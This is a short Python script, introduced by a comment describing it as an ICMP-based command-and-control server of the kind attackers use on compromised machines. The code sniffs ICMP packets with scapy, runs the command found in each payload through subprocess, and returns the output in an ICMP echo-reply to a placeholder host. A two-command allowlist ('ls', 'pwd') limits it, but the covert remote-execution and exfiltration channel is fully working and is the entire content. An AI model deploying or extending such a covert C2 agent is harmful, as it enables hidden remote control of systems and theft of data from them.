#This script appears to be a simple implementation of a command and control (C2) server using the ICMP protocol. When run, the script listens for incoming ICMP packets, decodes the payload, runs the command specified in the payload, and then sends an ICMP reply with the result of the command as the payload. This type of C2 server is commonly used by attackers to remotely control compromised devices.



#!/usr/bin/env python3
import os
import subprocess
from scapy.all import *

# define a list of allowed commands
ALLOWED_COMMANDS = ["ls", "pwd"]

# define a function to safely run a command
def run_command(command):
    # split the command into separate arguments
    args = command.split()
    # check if the command is allowed
    if args[0] not in ALLOWED_COMMANDS:
        # if not, return an error message
        return "Error: command not allowed"
    else:
        # if the command is allowed, run it and save the result
        try:
            result = subprocess.run(args, capture_output=True, check=True)
            return result.stdout
        except subprocess.CalledProcessError as err:
            return f"Error running command: {err}"

def main():
    while True:
        # wait for the ICMP message containing the command from the C2 server
        # to be received
        rx = sniff(filter="icmp", count=1)
        # strip down the packet to the payload itself
        command = rx[0][Raw].load.decode('utf-8')
        # run the command and save the result
        result = run_command(command)
        # build the ICMP packet with the result as the payload
        send(IP(dst="xxx")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/result)

if __name__ == "__main__":
    main()



